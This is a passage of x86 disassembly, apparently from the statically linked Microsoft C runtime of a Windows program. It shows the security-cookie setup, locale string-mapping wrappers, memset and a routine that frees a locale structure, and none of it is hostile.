  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
